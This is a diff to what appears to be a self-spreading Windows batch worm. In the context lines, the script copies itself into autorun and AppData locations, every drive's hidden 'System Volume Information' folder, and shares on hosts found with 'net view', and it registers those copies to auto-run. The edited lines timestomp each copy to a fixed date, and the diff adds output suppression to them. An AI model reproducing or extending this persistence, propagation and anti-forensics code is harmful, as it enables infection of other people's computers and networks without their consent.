@@ -47,7 +47,7 @@ if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg 
 
 
 
-%module_fileTouch% /w /a /c /d %app_date% "%~dpnx0"
+%module_fileTouch% /w /a /c /d %app_date% "%~dpnx0" >nul
 
 
 
@@ -75,12 +75,12 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 if exist "%path_autoRun1%\%~nx0" (
   copy /y "%~dpnx0" "%path_autoRun1%\"
-  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
+  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0" >nul
 )
 
 if not exist "%path_autoRun2%\%~nx0" (
   copy /y "%~dpnx0" "%path_autoRun2%\"
-  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
+  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0" >nul
 )
 
 
@@ -89,7 +89,7 @@ if not exist "%path_autoRun2%\%~nx0" (
 
 for %%i in (localAppData appData) do (
   if not exist "!%%i!\%~nx0" call copy /y "%~dpnx0" "!%%i!\"
-  call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
+  call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0" >nul
   %autoRun% add %%i "!%%i!\%~nx0"
 )
 
@@ -102,7 +102,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
     if /i "%%j" == "System Volume Information" (
       if not exist "%%i:\%%j\%~nx0" copy /y "%~dpnx0" "%%i:\%%j\"
       attrib +h +s "%%i:\%%j"
-      %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
+      %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0" >nul
       %autoRun% add %%i "%%i:\%%j\%~nx0"
     )
 
@@ -139,7 +139,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
       if /i "%%j" == "System Volume Information" (
         if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~dpnx0" "%%h\%%i\%%j\"
         attrib +h +s "%%h\%%i\%%j"
-        %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0"
+        %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0" >nul
         %autoRun% add %%i "%%i:\%%j\%~nx0" %%h
       )
   
